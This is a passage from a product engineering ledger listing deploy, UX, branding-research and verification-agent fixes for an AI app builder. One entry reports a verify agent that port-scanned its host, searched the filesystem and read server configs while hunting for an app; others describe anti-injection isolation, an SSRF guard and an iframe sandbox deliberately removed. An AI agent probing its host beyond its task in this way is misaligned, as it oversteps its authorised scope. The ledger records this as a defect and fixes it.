  packages so the resolver falls through to the working glibc binary. Verified on staging: a real chat
  turn returns `status:complete` (`"OK."`, ~4.7s) through the OAuth subscription credential + egress
  chokepoint. Note this class is invisible even to a boot smoke - a full check needs a live credential
  and one model turn.

Follow-up (recommended, not done here): add a container **boot smoke** to `deploy.yml` (run the api
image against a throwaway mongo, assert `/health` 200) so this whole class - a runtime import or native
binary absent from the shipped image - fails CI instead of first appearing on a server.

## Recently fixed - 2026-07-16 staging edge-proxy path allowlist incomplete

- **`staging-caddy-api-path-allowlist-incomplete`** (HIGH, deploy config; caught by the staging UI pass).
  The staging Caddyfile `@api` matcher routed only `/api/* /health /hooks` to the api container and sent
  **everything else** to Next (web). But the api owns a whole set of NON-`/api` browser-facing prefixes -
  the served-app pipeline `/apps/*` (the live build-**preview** iframe) and its injected runtime scripts
  `/__ekoa/*`, plus the static mounts `/artifact-screenshots/*`, `/artifact-pdfs/*`,
  `/automation-screenshots/*`, `/brand-assets/*`, and the share-link `/build/*` (all enumerated in
  `api/src/server.ts` buildApp). None were in the matcher, so each fell through to Next and returned a
  Next **HTML 404**. User-visible impact: (1) every featured/artifact card thumbnail 404'd -> blank
  cards on the home + `/artifacts` pages; (2) more seriously, `/apps/<id>/` app previews + `/__ekoa/`
  runtime were unreachable through the public origin - the core "build an app and preview it" flow was
  broken end-to-end via `staging.ekoa.io`. Loopback `http://127.0.0.1:4111` served all of these `200`,
  proving a pure edge-routing gap (not an api, seeding, or image defect). **Why it slipped:** Phase-5
  verification ran a chat turn (entirely under `/api/*`, which WAS routed) but never loaded a
  thumbnail-bearing dashboard page or an app preview through the public origin; and the dry-run deploy CI
  builds the images but never routes traffic through Caddy. **Fix:** extended `@api` to the full,
  documented allowlist (`/apps`, `/__ekoa/*`, the four static mounts, `/build`) - the Caddyfile now
  carries a source-of-truth comment mapping each prefix to its server.ts mount and stating the lockstep
  invariant. **Operational trap hit while deploying:** the Caddyfile is a single-file bind mount, which
  pins to an inode - editing it in place + `caddy reload` did NOT pick up the change (the container kept
  serving the stale inode); a `docker compose restart caddy` was required (now documented in the runbook +
  staging README). **Verified** via the public origin: all listed prefixes `200` (thumbnails `image/png`,
  `/apps/<id>/` `text/html`, `/__ekoa/*.js` `application/javascript`), web routes still reach Next, the
  `/api/v1` JSON envelope + `/health` intact, and a real-browser audit of `/` + `/artifacts` shows **0**
  broken images (41/41 and 82/82 thumbnails render) with **0** page errors. This **supersedes** the
  earlier working note that the blank thumbnails were "a fresh-staging seeding gap, not a deploy bug" -
  it was a deploy bug (the screenshots were on disk and served fine on loopback the whole time).

## Recently fixed - 2026-07-14 operator UX round (scope steering, verify narration, console noise)

- **`build-ambiguous-request-no-scoping`** (UX, operator 2026-07-14, live) - "faz uma app para
  ferias" built a personal vacation-itinerary planner with zero questions: the chat agent had no
  business-context steer and no scoping step, so ambiguous one-liners went straight to the wrong
  interpretation. Fixed in the content packs (business-scope section + ONE pre-marker scoping
  round; see decisions 2026-07-14) and pinned by a loader.test.ts canary.
- **`scaffold-copy-dev-facing`** (UX, operator 2026-07-14, live) - the app-base HomePage the end
  user watches DURING a build showed developer instructions ("Adicione páginas ao registo PAGES...
  frontend/src/pages/"). Now a user-facing PT building state ("A construir algo fantástico..." +
  pulse). data-demo-target="home-empty" and the mustEdit gate are untouched.
- **`verify-phase-silent-progress`** (UX, operator 2026-07-14, live) - the verify stage showed one
  status line then generic fillers for minutes (narration existed but landed in the COLLAPSED
  thinking block). Fixed: per-action ">> " narration contract in the verify prompt, re-emitted as
  same-status plan_steps -> live spinner label + Output tab (pinned by build.test.ts +
  verify-runner.test.ts). Two adjacent defects fixed with it: the verify scrub chain's hold-back
  tail was never flushed (final narration characters silently dropped), and the FC-505
  VerificationBanner was dead code (gated on a phase the store never received - plan_step phases
  now mirror into the store and the gate keys on 'verifying').
- **`monaco-cdn-csp-block`** (broken feature, operator 2026-07-14, live) - the file-editor dialog
  never initialized under the dashboard CSP: @monaco-editor/react's default loader pulls from
  cdn.jsdelivr.net, blocked by script-src 'self' ("Monaco initialization: error" + uncaught
  promise rejections in the console). Fixed by self-hosting the AMD tree from web/public/monaco
  (copy-monaco.mjs, predev/prebuild); the CSP was not widened.
- **`expected-absent-probe-console-noise`** (console hygiene, operator 2026-07-14, live) - every
  served-app load logged `GET /api/app-sso/me 401` (scaffold whoami) and, on tourless apps,
  `GET /api/demos/:appId 404` (panel teach probe) - "expected-absent" by design but console-visible
  on every load. Fixed with two additive always-200 probe routes (appSsoSession,
  demoAvailability - contract-tested) + repointed scaffold wiring and panel probe. Residual
  ACCEPTED: apps built BEFORE this change baked the old wiring and keep logging the /me 401, so
  the e2e benign-console allowlists for the 401 stay; the demos-404 allowlist entries were removed
  (the probe no longer 404s on any panel version served by a rebuilt api).
- **`preview-iframe-sandbox-warning`** (console hygiene, operator 2026-07-14, live) - Chrome
  warned "An iframe which has both allow-scripts and allow-same-origin... can escape its
  sandboxing" on every side-panel preview load (incl. each about:blank hot-reload hop). The
  sandbox attribute was removed (escapable as configured; see decisions 2026-07-14 for the
  isolation model + accepted top-navigation residual). Out of scope, not ours: the
  ObjectMultiplex "orphaned data" and MaxListenersExceededWarning lines in the same console
  capture come from the MetaMask extension's content script, not the product.
- **`suite-ledger-gate-crash-operator-run-gates`** (QA infra, found 2026-07-14 while running the
  gate) - `scripts/suite-ledger-run.mjs` threw `Unknown gate: operator-run C5` on the slice-named
  targetGates the operator run registered (commit ac1f3d3), so `npm run gate:ledger` AND
  `npm run e2e` crashed outright. Fixed: `gateIndex` maps any `operator-run*` gate to one shared
  post-G13 `OPERATOR-RUN` milestone (those drivers need the credentialed live stack and report
  as awaiting in the CI lane; they were live-verified during the operator run itself).
- **`suite-ledger-census-refusal-file-request`** (QA infra, found 2026-07-14 by the same gate
  run) - the unit census was red (disk 31 != ledger 30): commit 8996048 (BRIEF-9a) said
  "ledgered" but never added `refusal-file-request` to `frontend_unit.surviving`. Registered,
  with a census_note breadcrumb.

## Recently fixed - 2026-07-14 walkthrough-prep sweep (operator evidence pass)

- **`api-js-yaml-undeclared-dependency`** (dev-mode boot, 2026-07-14) - `api/` imports `js-yaml`
  (action-manifest parsing) but never declared it: at runtime it resolved ONLY as a transitive dep
  of **eslint** (a devDependency), so a production `npm ci --omit=dev` install would crash the API
  on import, and types came from an ambient shim (`api/src/automation/vendor.d.ts`) that tsc loads
  via `include` but the ts-node ESM loader does not (`files: false`) - making `EKOA_API_MODE=dev`
  die on boot with an unrenderable TS7016 diagnostic (`[Object: null prototype]`). This was the
  ledgered G8 action the shim itself prescribed. Fixed: `js-yaml` added to api dependencies,
  `@types/js-yaml` to devDependencies, shim deleted, and the api `dev` script switched to
  `ts-node/esm/transpile-only` (type checking stays with the `typecheck` gate; dev watch restarts
  no longer pay a whole-program check and are immune to the ambient-file-loading gap class).
- **`app-manifest-recipe-dsl-undocumented`** (discovery, 2026-07-14, live) - the app base ships
  skills for `ui_actions` (declaring-ui-actions) and tours (authoring-tours) but NONE for the
  `capabilities:` recipe DSL, so build agents GUESS the shape. Observed live on a fresh tarefas
  build: the agent flattened `store.query` (`{ op: store.query, field: ..., op: eq, ... }` - the
  comparison belongs under `where: { field, op, value }`), duplicating the `op` key; ONE invalid
  line fails the whole frontmatter YAML parse at activation, so the app lost BOTH its action
  manifest AND its tours (`actionManifestError` + `toursError`) - the assistant could neither
  operate nor teach the app, and the errors surface only in server logs (no operator UI). Fixed:
  (a) new base skill `api/assets/bases/app/skills/declaring-capabilities.md` documenting the EXACT
  recipe op shapes (source of truth: `api/src/automation/platform-primitives.ts`) with the
  store.query `where:` mistake called out; (b) the live app repaired through the product's own
  path (an admin patch run dictating the corrected line) - tour + 2 actions now served. Residual
  (minor, open): `actionManifestError`/`toursError` are invisible outside server logs; consider an
  operator-visible surface.
- **`app-custom-action-unregistered`** (discovery, 2026-07-14, live) - second instance of the
  agent-content class: the tarefas build declared `ui_actions: - id: tarefa-adicionar, kind: custom`
  but never registered `window.__ekoaApp.actions['tarefa-adicionar']` (the declaring-ui-actions
  contract), so the assistant's operate flow ALWAYS failed its second action ("Não foi possível
  executar a ação.") - observed on camera. No build-time check catches a declared custom id with no
  registration in the app source. Live app repaired via patch run (kind -> `toggle`, a declarative
  click, no registration needed). Residual (minor, open): readUiActions could WARN when a custom id
  has no `__ekoaApp.actions[` registration anywhere in frontend/src.
- **`edit-mode-preview-not-visible-in-page`** (UX, open, 2026-07-14, observed live) - after a
  patch run completes, the panel's preview phase shows only the sha diff; the RUNNING served-app
  page keeps executing the old bundle (nothing reloads it), and manually reloading to SEE the
  change destroys the pending approve/revert panel state (client-only), leaving no panel path to
  revert. The admin therefore decides from shas alone. Fast-follow candidates: an in-panel
  "recarregar a aplicação" affordance that persists the pending preview (e.g. sessionStorage), or
  a live-reload signal to the served page on activation (the dashboard preview already gets
  preview_reload). Sits beside the ledgered `h3-edit-mode-no-cancel` fast-follow. Also note: the
  post-restore dist rebuild is asynchronous - an immediate reload can race it.
- **`assistant-operate-turn-noise-citations`** (minor, open, 2026-07-14) - an operate-mode panel
  turn ("Adiciona uma tarefa...") rendered a Fontes block citing five irrelevant jurisprudência
  acórdãos (org grounding ran and cited for a non-question turn). Cosmetic but confusing; consider
  suppressing citations on do-mode turns whose grounding contributed nothing.
- **`panel-dead-tour-launcher`** (discovery, 2026-07-14, fixed in d172c2a) - teach mode offered
  "Iniciar tutorial guiado" unconditionally; on an app with no stored tour the player can only
  error ("an app with no tours simply has no teach path", authoring-tours). The panel now probes
  GET /api/demos/:appId once on mount (zero-token) and renders the launcher only when a tour
  exists. Asset rebuilt; the RUNNING api caches panel bytes in memory, so the live swap (and its
  live verification) lands on the next stack boot - the E2 driver covers it (its demos stub
  precedes navigation, so the probe is fulfilled).

- **`chat-refusal-affordance-unwired`** (discovery, 2026-07-14) - BRIEF 9a promised a refused
  build in the dashboard chat "converts into a pre-drafted build request routed to the org-admin
  - never a dead end", and diagram 03's H4 block + the change-requests store's `fileFromRefusal`
  action both claimed the feed - but NO component ever called it: a capability refusal
  (POST /jobs 403 `canBuildApps`/`canEditApps`) rendered as a plain red error with no way to file
  the pedido (code-behind-diagram drift; the served-app panel path was wired, the dashboard chat
  path was not). Fixed: `useAgentExecution` attaches the pre-drafted request
  (`metadata.refusal = { text, appId? }`) to the capability-refusal message, and the chat bubble
  renders "Pedir ao administrador" -> `fileFromRefusal` -> "Pedido enviado ao administrador."
  (`data-testid` chat-refusal-file/filed). Pinned by `web/__tests__/refusal-file-request.test.ts`
  (403+capability carries the payload incl. appId on follow-ups; 500 and capability-less 403 do
  not). Diagram 03 already depicted the flow - no diagram change needed.
- **`assistant-panel-e2e-stale-intro-assert`** (discovery, 2026-07-14) - the committed D2 driver
  `api/tests/e2e/assistant-panel.e2e.mjs` asserted the first-open lead contains "apresentar", but
  the shipped copy (AssistantPanel.jsx) says "mostrar ... ensinar ... operá-la": a re-run failed at
  step B on copy drift, not behavior. Fixed the assertion to the shipped copy ('mostrar').

## Recently fixed - 2026-07-13 preview probe CORS duplicate header (operator)

- **`F-2026-07-13-proxy-duplicate-acao`** (operator-reported, 2026-07-13) - in dev, the preview
  probe's `HEAD /apps/<slug>/` from the dashboard origin failed CORS on EVERY request:
  `The 'Access-Control-Allow-Origin' header contains multiple values '*, http://localhost:3000'`
  (`net::ERR_FAILED` despite a 200), so `probePreviewDocument` classified every served app as
  `transient` and the panel's probe-gated first render churned through its retry budget. Root
  cause: both dev CORS proxies (`.claude/skills/run-ekoa-code/driver.mjs` and its verbatim copy in
  `api/tests/journeys/boot-b.mjs`) merged response headers with
  `{ ...proxyRes.headers, ...corsHeaders(req) }` - Node lowercases upstream header names while
  `corsHeaders()` uses mixed case, so on planes where the api sets its OWN CORS header
  (`/apps/*` and design tokens send `Access-Control-Allow-Origin: *` - `serving.ts`,
  `design-tokens.ts`) the spread kept BOTH keys and the wire carried two ACAO values, which
  browsers reject outright. Dev-only (prod is same-origin, no proxy). Fixed in both files:
  upstream-wins per-header merge (`mergeResponseHeaders`) - the proxy only injects the CORS
  headers upstream did not already set, so `/apps/*` answers a single `ACAO: *` exactly as
  `web/lib/preview-probe.ts` documents, and `/api/*` keeps the reflected-origin set. Verified
  live through a restarted boot-b stack: `/apps/legal-agenda-reservas/` ACAO count 1 (`*`),
  `/health` reflected origin single-valued, OPTIONS preflight unchanged.

## Recently fixed - 2026-07-12 preview "proxy error" (operator)

- **`F-2026-07-12-preview-502`** (operator-reported, 2026-07-12) - during a build, the side-panel
  preview iframe displayed a raw `proxy error` body and stayed there (screenshot: 502 on the
  `/apps/<id>/?token=` document request while adjacent `/api/v1/billing/usage` calls returned 200).
  Two stacked defects:
  1. **Dev-harness proxy transient** (root cause of THIS 502): the run-ekoa-code driver's CORS
     reverse proxy (`.claude/skills/run-ekoa-code/driver.mjs`) forwarded upstream requests over the
     Node 20 global agent (keep-alive pooled, server closes idles at its default 5s
     `keepAliveTimeout`) and answered ANY pre-response upstream socket error with a bare 502
     `proxy error` - silently (no log), so the exact errno of the operator's occurrence (2 of 265
     requests) is unrecoverable. Fixed: fresh upstream connection per request
     (`http.Agent({ keepAlive: false })` - loopback, sub-ms), one replay for bodyless idempotent
     methods (GET/HEAD) failing before a response, upstream errors logged with method/path/errno,
     and a mid-stream failure destroys the response instead of appending garbage. Forensics note:
     the classic close-vs-reuse race would NOT reproduce in 365 timed attempts against Node 20
     (agent honors the server's Keep-Alive hint), so the residual trigger class is broader than
     that race - the fix covers the class, and the new logging captures any recurrence.
  2. **Preview panel could not recover** (product gap, any 5xx source incl. a prod edge blip): an
     iframe NEVER fires its error event for an HTTP error response - it renders the error body and
     fires `load` - so `side-panel.tsx`'s retry machinery never engaged and the raw body stuck
     until a manual refresh. Fixed: `web/lib/preview-probe.ts` classifies the document plane via a
     HEAD probe (`ok` 2xx / `transient` network+5xx / `hard` other); the panel now gates the first
     iframe render on the probe (polls at the existing 500ms/30s bounds), re-probes on every iframe
     `load`, routes `transient` into the existing bounded retry, restores the retry budget on a
     verified-ok load, and renders `hard` pages (410 revoked) as-is. Manual refresh polling unified
     on the same classification (and now probes the tokened URL the iframe actually loads).
  Accepted residual: a blip that hits ONLY the iframe's GET while the adjacent HEAD probes pass is
  undetectable cross-origin without a new parent<->iframe liveness protocol on the byte-compat
  injection plane (the demo bridge stays dormant until `demo.init` by design) - disproportionate;
  revisit only if it recurs behind the fixed proxy/edge. Tests:
  `web/__tests__/lib/preview-probe.test.ts` (classification),
  `web/__tests__/components/side-panel-preview-recovery.test.tsx` (wiring: probe-gated first
  render, 410 renders as-is, on-load transient -> retry -> recovery); both fail against the
  pre-fix behavior. Live-verified 2026-07-12: stack restarted on the fixed driver, real-UI login,
  /artifacts + served `legal-nucleo` render through the proxy, 16/16 doc-plane requests across
  5s keep-alive boundaries clean.

## Recently fixed - 2026-07-12 brand research colors (operator round 3)

- **`brand-colors-fake-teal`** (operator-reported, 2026-07-12) - research on
  mariliasantoscabral.webnode.pt showed primary `#0d9488` (teal-600, the OLD platform default) on a
  navy/white site with no teal anywhere. Root-cause forensics (live DB + job records + a live
  extraction probe) proved the teal never existed in the pipeline, the model output, or the org
  record: it was the branding page's HARDCODED display fallbacks (`#0d9488`/`#1e293b`) rendered
  whenever `org.branding` lacked colors - indistinguishable from a research result, and
  `handleSaveBranding` would persist them verbatim on Guardar. Fixed: unset colors are `null` state
  end-to-end (explicit "Não definida" swatch/placeholder, neutral preview placeholders), Save OMITS
  unset colors, and the exact pair appears nowhere. Tests: `web/e2e/branding-colors.spec.ts`.
- **`brand-research-silent-no-color`** (same run) - the research flow structurally could not produce
  a color for this site yet reported success: the grounded snapshot contained ONLY grayscale hexes,
  the model complied, `sanitizeBrandColors` nulled them, the patch dropped the nulls, and the job
  completed `brandingApplied:true` with no signal (the old cortex NO_PRIMARY_COLOR fail-loud guard
  was never ported - color-filter.ts's own comment referenced a "no usable primary guard" that did
  not exist). Fixed as partial-apply-with-warning: the job result + complete event + `jobView` carry
  `colorsApplied` and `warnings: [NO_PRIMARY_COLOR]`; the web shows an amber "defina-as manualmente"
  banner/toast instead of green success. Tests: `api/tests/contract/branding.test.ts` (fail-loud
  monochrome case), shared `Job` schema extended.
- **`brand-colors-image-only-blind`** (same run, the actual extraction gap) - the firm's navy lives
  ONLY as pixels in the hero JPEG; the rendered walker samples computed styles, so `paintedHexes`
  came back empty, the Webnode builder scrub then intersected the CSS candidates against that empty
  set and wiped all 8, leaving the model four grayscale hexes. Fixed with a screenshot-PIXEL
  quantization fallback in `rendered-candidates.ts` (fires only when nothing non-neutral paints;
  in-page canvas quantization of the Playwright screenshot - a data: image, so no cross-origin
  taint), surfaced as an explicitly low-confidence "Cores amostradas dos píxeis" prompt section with
  a neutral-ban rule, deliberately exempt from the brandFit floor (the desaturated navy ~0.26 is the
  point). Live-verified against the real site: research now persists primary `#374559` (the actual
  hero navy) and no neutrals. Tests: `api/tests/services/branding/rendered-candidates.test.ts`
  (`screenshotClustersToCandidates`), `snapshot.test.ts` (pixel section + rules).
- **`brand-colors-no-membership-guard`** (found during the fix, latent in old cortex too) - the
  "every returned hex must appear literally in a candidate list" rule was prompt-only; a
  hallucinated saturated color would have merged unchecked. Fixed: `collectAllowedHexes` gathers the
  snapshot evidence and the apply-step NULLS any returned color outside it (grounded path only).
  Tests: `api/tests/contract/branding.test.ts` (out-of-snapshot teal dropped),
  `snapshot.test.ts` (`collectAllowedHexes`).
- **`sanitize-accent-gap`** (same run) - `sanitizeBrandColors` never checked `accentColor`, so gray
  `#9d9d9d` persisted as the org accent; and the promotion swap PARKED the demoted gray in the
  accent slot. Fixed: a grayscale accent is nulled last (no slot ever persists a neutral). Tests:
  `api/tests/services/branding/color-filter.test.ts`.
- **`branding-save-wholesale-wipe`** (found during the fix) - `saveBrandingHandler` passed the
  client's 4-field branding object straight to `updateOrg`, which replaces top-level keys wholesale:
  every dashboard Guardar silently WIPED `designSystem`/`visualVibe`/researched fields. Fixed: the
  handler merges onto existing branding (same semantics as the research apply-step). Test:
  `api/tests/contract/branding.test.ts` (save-merge case).
- **`accent-picker-secondary-binding`** (same run) - the "Cor de Destaque" picker was bound to
  `secondaryColor`, so the persisted `accentColor` was never displayed and Save wrote the fallback
  slate into `secondaryColor` under an accent label. Fixed: the accent picker binds `accentColor`.
  Test: `web/e2e/branding-colors.spec.ts` (accent stays unset when only primary is saved).
- **`branding-page-stale-until-reload`** (operator-reported, 2026-07-12 follow-up: "had to refresh
  to see the changes on the brand area") - the branding page re-syncs its local editor state only
  when the `${company.id}_${company.updatedAt}` fingerprint changes, but `orgView` never returned
  `updatedAt` and nothing stamped it, so the fingerprint NEVER changed after mount: the
  `branding_updated` notification correctly refetched the company (round-2 fix), the store updated,
  and the page kept rendering stale colors/name until a reload remounted it. Fixed server-side:
  `updateOrg` stamps `updatedAt` on every org patch, `orgView` + shared `OrgConfig` expose it.
  Live-verified: page open on the Marca tab, research fired via API, primary + company name updated
  in place with zero navigation. Test: `api/tests/contract/branding.test.ts` (updatedAt present +
  changes across saves + GET /org parity).
- **`founder-name-never-updated`** (operator-visible in the same screenshot) - "Founder" is the
  seedAdmin bootstrap displayName; `BrandResearchResult` had no `companyName` field, so research
  could never replace it (old cortex wrote displayName from the extracted companyName). Fixed:
  `companyName` added to the shared schema + both system prompts, applied to `org.displayName`
  (never merged into branding, via `RESEARCH_META_KEYS`). Live-verified: displayName became
  "Marília Santos Cabral". Test: `api/tests/contract/branding.test.ts` (companyName case).

## Recently fixed - 2026-07-11 operator round 2 (build surface + verify + logo)

- **`verify-runner-portscan-hang`** (operator-reported, 2026-07-11) - a simple flyer build sat in
  `verifying` with NO output for 13+ minutes, then surfaced a half-redacted raw SDK error ("Agente
  EKOA Code returned an error result: Reached maximum number of turns (15)"). Root causes, from the
  verifier's own transcript: (1) `build.ts` passed the artifact-relative `appUrl` (`/apps/<id>/`,
  no origin) verbatim into the verify prompt, so the agent PORT-SCANNED the host (`:80 :3000 :8080
  :5173 :7080-7090`, `find /`, old-ekoa nginx configs) hunting for the app it could never find;
  (2) the build wall-clock/inactivity timers are cleared BEFORE verify, so nothing bounded it;
  (3) the raw error string reached the user chat. Fixed in `apps/verify-runner.ts`: the prompt gets
  an ABSOLUTE loopback URL (`resolveVerifyUrl` - the API serves `/apps/*` itself), a hard
  `AbortSignal.timeout(verifyWallClockMs)` (5 min default, env-tunable) as the REAL bound, an
  explicit no-scavenger-hunt rule (URL dead → FAIL immediately, never search the host), a
  proportionate-effort rule (static flyer → quick pass), live narration forwarded through the new
  job thinking channel (`onProgress` seam), and PT-generic user-facing notes (raw errors go to the
  server log only). Turn ceilings raised per operator directive ("must never stop users mid-task"):
  verify 15→60, build 100→500, chat 30→60 - backstops, not bounds. A verify note no longer REPLACES
  the agent's completion summary (it's appended). Tests: `api/tests/apps/verify-runner.test.ts`.
- **`build-chat-raw-internals`** (operator-reported, 2026-07-11) - the build transcript showed raw
  tool calls (Bash command lines, Read/Write with absolute sandbox paths, tool results incl. "File
  does not exist... your current working directory is /Users/..."), "Routing: EXPERT - first build",
  commentary bubbles split MID-WORD ("...construir s" / "obre a estrutura..."), and the final
  summary named `window.__ekoa.exportPdf`. Root causes: `build.ts` flattened the chokepoint's
  thinking/text channels into `text_chunk` (chat.ts had the thinking channel; build never did);
  `useJobStream` flushed the live buffer into a permanent message on EVERY tool_event (the mid-word
  chops) and rendered raw tool traffic + the routing decision into the user-visible feed. Fixed:
  `JobEvent` gained `thinking_chunk`; build routes commentary through MarkerProcessor +
  StreamingIdentityRedactor into the collapsible thinking UI (same as chat); the activity feed shows
  friendly white-labelled one-liners with project-relative paths (never commands/results/routing);
  `BUILD_SYSTEM_PROMPT` forbids internal API/machinery names in the final user-facing message.
- **`build-no-live-preview-no-files`** (operator-reported, 2026-07-11) - preview stayed empty during
  (and after) the build and the files area showed nothing, even though `prepareFirstBuild` had
  ALREADY built + registered + served the scaffold ("register it so the preview is live before the
  agent runs" - the last mile was never wired: nothing emitted `preview_reload`, and the client
  learned the artifactId only at `complete`). Fixed: new `JobEvent` `artifact`
  `{artifactId, appUrl, slug}` emitted right after prep/resolve → the preview iframe + REAL file
  tree (GET `/artifacts/:id/files`, the scaffold/template files) show from second zero; the esbuild
  watcher's `onRebuild` now fires `sink.previewReload()` so the iframe follows the agent's writes
  live (follow-up builds get a watcher too - they previously ran without one); the Files tab is fed
  from the server list (source of truth) with live +/M/D badges, and file paths are project-relative
  - which also fixes the Monaco editor dialog (it exists and works; it was sending
  `sandboxes/...`-prefixed paths that the path-confined API rejected). Latent bug fixed on the way:
  follow-up completion blanked the artifact's slug/appUrl (`resolveFollowUp` now returns them).
- **`brand-logo-wrong-image`** (operator-reported, 2026-07-11) - "not the logo at all": the logo
  picker chose a 380KB touch-icon (`/brand-assets/01d6df7c73d6.png`) because selection was
  source-name heuristics only (favicons/og-image) with no eyes on the rendered page - the OLD ekoa
  worked better because its research agent DROVE A BROWSER and picked the header logo by sight.
  Restored that ability tool-lessly (§5.6.4 intact): (1) `rendered-candidates.ts` now harvests logo
  candidates from the RENDERED DOM (header/nav imgs, inline `<svg>` logos - stored as sanitized
  local svg assets - and logo-classed background images), scored by placement (header, top-left,
  home-link, logo attrs, aspect ratio); (2) new top trust tier `rendered-header` beats
  design-system/favicon sources, JPEG photos demoted within tiers; (3) ONE FAST vision one-shot
  (`logo-vision.ts`) compares the downloaded candidates against the header-strip screenshot and can
  override the heuristic pick ("qual é o logótipo visível no cabeçalho?"). Tests extended in
  `api/tests/services/branding/brand-assets.test.ts`.
- **`brand-stale-until-refresh`** (operator-reported, 2026-07-11) - the dashboard kept the old
  brand until a manual page reload. The Marca page refetches on its own job stream, but the header
  logo/theme only read the company store on first load. Fixed with a `branding_updated`
  notification (NotificationEvent) emitted when research applies branding; the header listens on
  the global notifications stream (same pattern as `usage_updated`) and refetches the company
  config - live brand refresh, no reload.
- **`verify-blocked-by-shareability-gate`** (found during the live re-verify of the fix above) -
  with the URL fixed, the verifier reached the app in 17 SECONDS but got the §7.7 "Link já não
  disponível" page: a draft, non-shareable artifact's document is owner-gated, and the verify
  agent carries no auth (and must NEVER carry a user JWT in an agent transcript - it would
  authenticate on every API route). Fixed with a PURPOSE-SCOPED preview token
  (`services/preview-token.ts`: HMAC capability `pv1.<artifactId>.<exp>.<mac>`, not a JWT,
  grants viewing ONE artifact's served document for the verify window): verify-runner appends it
  to the URL; serving.ts accepts it in the owner-bypass ahead of the user-JWT path. Verdict notes
  are now requested in PT (they surface to the end user). Tests: preview-token expiry/tamper +
  resolveVerifyUrl token cases in `api/tests/apps/verify-runner.test.ts`.
- **`app-pdf-endpoint-never-mounted`** (CAUGHT BY THE NOW-WORKING VERIFIER, live 2026-07-11:
  "o botão 'Descarregar PDF' não funciona — o servidor retorna um erro 404") - the injected
  `window.__ekoa.exportPdf` client was carried in the port but its endpoint `POST /api/app-pdf`
  (and the `/artifact-pdfs` static mount) never were: EVERY in-app document export 404'd since
  rc-1. Ported from old cortex into `apps/pdf.ts`: `renderAppDocumentPdf` (page JS disabled,
  subresource allowlist blocking private ranges/metadata, injected `<base>`, embedded print
  reset, @page-aware margins) + `appPdfRouter` (X-Ekoa-App-Id scoping, html required, 4MB cap)
  + both mounts in server.ts. Contract test: `api/tests/contract/app-pdf.test.ts`. Second-order
  fix in the same class: agent-written `@import '/api/design-tokens.css'` failed the whole
  esbuild bundle ("could not resolve") - server-absolute paths are now treated as runtime URLs
  (CSS externals / JS stubs) in builder.ts's resolver, and the coding-agent content now says the
  tokens are auto-linked in index.html and must never be imported.
- **`brand-consent-overlay-polluted-vision`** (found during the live re-verify) - plmj.com's
  Cookiebot overlay covered the header strip, so the logo-vision ground truth showed a cookie
  banner and the rendered harvest scored a team-PORTRAIT carousel into the top tier (position +
  aspect alone). Fixed: `consent-chrome.ts` (shared vendor-token list + in-page removal) runs
  before EVERY rendered pass (colours, logo harvest, header shot, visual-vibe screenshots);
  harvest candidates now require a STRUCTURAL logo signal (logo attrs / header-nav / home-link)
  to qualify, and photo JPEGs are score-penalized. Re-verified live: the vision gate then
  correctly overrode dembrandt's white-on-white candidate to the REAL PLMJ wordmark, and the
  header logo swapped in live (`navigations: 1`, no reload).
- **`brand-assets-url-keyed-cache-staleness`** - stored assets were keyed by md5(source URL), so
  a re-research whose logo changed at the same URL kept the same `/brand-assets/<hash>` path and
  every browser served its stale cached copy. Now keyed by md5(CONTENT).
- **`dev-harness-30s-health-window`** - `scripts/dev-api.mjs` killed healthy API boots at 30s while
  a cold boot registering ~200 featured apps takes ~90s. Now 120s default (`DEV_API_HEALTH_TIMEOUT_MS`
  override); the run-skill driver's API window raised to 180s.

## Recently fixed - 2026-07-11 stabilization run

- **`brand-research-site-blind`** (operator-reported, 2026-07-11) - brand research "saved nothing
  from the site": the agent was TOOL-LESS *and* model-knowledge-only, so it never touched the
  target website, never saved a logo, and never produced a design system - it emitted a plausible
  palette from memory and the job's `summary`/`confidence` were the only real output. Fixed by
  porting the REAL cortex pipeline as deterministic SERVER-SIDE services (`api/src/services/branding/`):
  `fetchSiteContext` (HTML + linked-CSS scrape: title/meta/generator, CSS colour + font candidates),
  `fetchRenderedCandidates` (headless-Chromium area-weighted painted colours + fonts),
  `fetchDesignSystem` (the `dembrandt` 0.23 CLI: confidence-scored palette, CSS variables, typography,
  spacing, radii, shadows, button styles, frameworks), `fetchVisualVibe` (hero/mid/footer screenshots
  → vision one-shot → mood/shape/density/texture/hero), plus website-builder chrome detection/scrub so
  a Webnode/Wix promo stripe never masquerades as the brand. The agent STAYS tool-less (§5.6.4
  anti-injection): all site access is server code, the model receives a server-built snapshot and
  returns constrained JSON grounded "usa APENAS a informação do snapshot". The orchestrator
  (`agents/brand-research.ts`) now: fetch site-context → (parallel) rendered + dembrandt + vibe →
  grounded `runOneShot` → resolve + STORE a real logo file under `/brand-assets/<file>` (SSRF-guarded
  download, content-type + size cap) → merge colours/fonts/tone/instructions + `designSystem` +
  `visualVibe` + `logo` onto `org.branding`. Site unreachable → honest degradation to the
  knowledge-only prompt, noted on the job (`siteReachable: false`). All server fetches of the
  user-supplied URL go through the SSRF guard (new `guardedFetchFollow` re-validates each redirect
  hop); the dembrandt URL is guard-validated BEFORE the subprocess spawns. `shared/OrgBranding`
  gained optional typed `designSystem` (StoredDesignSystem) + `visualVibe` fields (the dashboard
  Design System tab already reads them). Covered by 6 unit suites under
  `api/tests/services/branding/` + the extended `api/tests/contract/branding.test.ts` (reachable-site
  run merges colours + designSystem + visualVibe + a stored logo; unreachable degrades to knowledge).
  Decision logged in `docs/decisions.md`. LIVE-VERIFIED 2026-07-11 against plmj.com: real logo stored
  and served at `/brand-assets/...`, real brand colours (`#110088` navy + `#a90707` red), real fonts
  (Domaine Display + GT America), a populated Design System tab (palette + typography + visual vibe),
  visible in the Marca preview. Three follow-up fixes made during that live verification:
  (a) **vibe screenshots exceeded the 32MB provider request cap** ("Request too large") - three
  viewport PNGs of a photo-heavy site are multi-MB base64; switched the vibe captures to JPEG q60
  (`api/src/services/branding/visual-vibe.ts`), which keeps each shot in the low-hundreds-of-KB.
  (b) **cookie-consent vendor chrome leaked into the palette** - dembrandt colours whose sources were
  all `cybotcookiebotdialog...`/OneTrust/etc. were surviving; added a builder-independent
  consent-chrome source filter in `filterDesignSystemChrome`, AND made `scrubBuilderChrome` always run
  the design-system filter (it previously early-returned when NO site-builder was detected, so custom
  sites like plmj.com were never scrubbed). (c) A `manifest:theme_color` white legitimately survives
  (mixed owner source) - by design. Covered by new cases in the design-system + snapshot suites.
- **`gateway-empty-text-block-cache-control`** (vision-discovered, walkthrough 2026-07-11) - the
  Agent SDK intermittently appends an EMPTY text block that still carries a `cache_control`
